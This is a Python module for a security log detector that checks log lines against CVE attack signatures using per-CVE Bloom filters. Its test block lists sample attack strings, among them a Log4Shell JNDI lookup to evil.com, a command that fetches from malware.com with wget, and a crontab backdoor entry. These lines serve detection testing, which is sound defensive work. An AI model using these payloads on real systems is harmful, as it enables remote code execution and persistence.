"""
Pattern Bloom Filter (Layer 1)

Fast pattern matching against CVE attack signatures.
Target: 2.5 μs per log (18-48x faster than regex).
"""

from pybloom_live import BloomFilter
from typing import Set, List, Dict, Tuple
import time

from ..signatures.cve_loader import CVELoader, CVESignature
from ..processors.tokenizer import LogTokenizer
from ..bloom.bloom_config import BloomConfig


class PatternMatch:
    """Represents a pattern match result"""

    def __init__(self, cve_id: str, stage: int, technique_id: str, match_count: int, confidence: float):
        """
        Initialize pattern match

        Args:
            cve_id: CVE identifier
            stage: Attack stage number
            technique_id: MITRE technique ID
            match_count: Number of patterns matched
            confidence: Confidence score (0-1)
        """
        self.cve_id = cve_id
        self.stage = stage
        self.technique_id = technique_id
        self.match_count = match_count
        self.confidence = confidence

    def __repr__(self) -> str:
        return f"PatternMatch({self.cve_id}, stage={self.stage}, matches={self.match_count}, conf={self.confidence:.2f})"


class PatternBloomManager:
    """
    Manages Pattern Bloom Filters for CVE signature matching

    Each CVE gets its own Bloom filter populated with attack patterns.
    This allows fast parallel checking across all CVEs.
    """

    def __init__(self, cve_loader: CVELoader, config: BloomConfig = None):
        """
        Initialize Pattern Bloom Manager

        Args:
            cve_loader: CVE signature loader
            config: Bloom filter configuration
        """
        self.cve_loader = cve_loader
        self.config = config or BloomConfig()
        self.tokenizer = LogTokenizer(
            ngram_min=self.config.ngram_range[0],
            ngram_max=self.config.ngram_range[1]
        )

        # Create separate Bloom filter for each CVE
        self.pattern_filters: Dict[str, BloomFilter] = {}

        # Track patterns per stage for each CVE
        self.cve_stage_patterns: Dict[str, Dict[int, Set[str]]] = {}

        # Performance metrics
        self.stats = {
            'checks': 0,
            'matches': 0,
            'total_time_us': 0
        }

        self._initialize_filters()

    def _initialize_filters(self):
        """Initialize Bloom filters with CVE patterns"""
        print("Initializing Pattern Bloom Filters...")

        for signature in self.cve_loader.get_all_signatures():
            # Create Bloom filter for this CVE
            bloom = BloomFilter(
                capacity=self.config.pattern_capacity,
                error_rate=self.config.pattern_error_rate
            )

            # Track patterns per stage
            stage_patterns = {}

            # Add all patterns from all stages
            for stage_data in signature.stages:
                stage = stage_data['stage']
                patterns = stage_data['patterns']

                # Tokenize each pattern and add to Bloom filter
                stage_tokens = set()
                for pattern in patterns:
                    tokens = self.tokenizer.tokenize_signature(pattern)
                    for token in tokens:
                        bloom.add(token)
                        stage_tokens.add(token)

                stage_patterns[stage] = stage_tokens

            self.pattern_filters[signature.cve_id] = bloom
            self.cve_stage_patterns[signature.cve_id] = stage_patterns

        print(f"Initialized {len(self.pattern_filters)} Pattern Bloom Filters")
        print(f"Total memory: ~{len(self.pattern_filters) * 1.2:.2f} MB")

    def check_log(self, log_text: str) -> List[PatternMatch]:
        """
        Check log against all CVE pattern filters

        Args:
            log_text: Raw log message

        Returns:
            List of pattern matches found
        """
        start_time = time.perf_counter()

        # Tokenize log
        tokens = self.tokenizer.tokenize(log_text)

        matches = []

        # Check against each CVE's pattern filter
        for cve_id, bloom in self.pattern_filters.items():
            signature = self.cve_loader.get_signature(cve_id)

            # Check which stage(s) match
            for stage, stage_tokens in self.cve_stage_patterns[cve_id].items():
                match_count = 0

                # Count how many tokens from this stage are in the log
                for token in tokens:
                    if token in bloom and token in stage_tokens:
                        match_count += 1

                # If matches exceed threshold, record it
                if match_count >= self.config.pattern_match_threshold:
                    technique_id = signature.get_stage_technique(stage)

                    # Calculate confidence based on match count
                    confidence = min(match_count / len(stage_tokens), 1.0) if stage_tokens else 0.0

                    matches.append(PatternMatch(
                        cve_id=cve_id,
                        stage=stage,
                        technique_id=technique_id,
                        match_count=match_count,
                        confidence=confidence
                    ))

        # Update stats
        elapsed_us = (time.perf_counter() - start_time) * 1_000_000
        self.stats['checks'] += 1
        self.stats['total_time_us'] += elapsed_us
        if matches:
            self.stats['matches'] += 1

        return matches

    def batch_check_logs(self, logs: List[str]) -> List[List[PatternMatch]]:
        """
        Check multiple logs in batch

        Args:
            logs: List of log messages

        Returns:
            List of pattern match lists (one per log)
        """
        return [self.check_log(log) for log in logs]

    def get_performance_stats(self) -> dict:
        """Get performance statistics"""
        avg_time = self.stats['total_time_us'] / self.stats['checks'] if self.stats['checks'] > 0 else 0
        match_rate = self.stats['matches'] / self.stats['checks'] if self.stats['checks'] > 0 else 0

        return {
            'total_checks': self.stats['checks'],
            'total_matches': self.stats['matches'],
            'match_rate': match_rate,
            'avg_time_us': avg_time,
            'throughput_per_sec': 1_000_000 / avg_time if avg_time > 0 else 0
        }

    def reset_stats(self):
        """Reset performance statistics"""
        self.stats = {
            'checks': 0,
            'matches': 0,
            'total_time_us': 0
        }

    def get_filter_stats(self) -> dict:
        """Get Bloom filter statistics"""
        return {
            'num_filters': len(self.pattern_filters),
            'capacity_per_filter': self.config.pattern_capacity,
            'error_rate': self.config.pattern_error_rate,
            'estimated_memory_mb': len(self.pattern_filters) * 1.2
        }

    def __repr__(self) -> str:
        return f"PatternBloomManager({len(self.pattern_filters)} CVEs loaded)"


if __name__ == "__main__":
    # Test Pattern Bloom Filter
    from pathlib import Path

    # Load CVEs
    base_path = Path(__file__).parent.parent.parent
    cve_loader = CVELoader(base_path / "data/signatures/cve_signatures.json")

    # Create Pattern Bloom Manager
    pattern_bloom = PatternBloomManager(cve_loader)

    print(f"\n{pattern_bloom}")
    print(f"Filter stats: {pattern_bloom.get_filter_stats()}")

    # Test logs
    test_logs = [
        "${jndi:ldap://evil.com/exploit}",
        "Normal log message without any suspicious patterns",
        "Runtime.exec('/bin/bash -c wget http://malware.com')",
        "crontab entry added: @reboot /tmp/.hidden/backdoor.sh",
        "SMB connection to \\\\PIPE\\\\samr with NT_STATUS_INSUFF_SERVER_RESOURCES"
    ]

    print("\n" + "="*60)
    print("Pattern Matching Test:")
    print("="*60)

    for log in test_logs:
        matches = pattern_bloom.check_log(log)
        print(f"\nLog: {log[:60]}...")
        if matches:
            for match in matches:
                print(f"  {match}")
        else:
            print("  No matches")

    # Performance stats
    print("\n" + "="*60)
    print("Performance Statistics:")
    print("="*60)
    stats = pattern_bloom.get_performance_stats()
    for key, value in stats.items():
        if 'time' in key or 'throughput' in key:
            print(f"{key}: {value:.2f}")
        else:
            print(f"{key}: {value}")
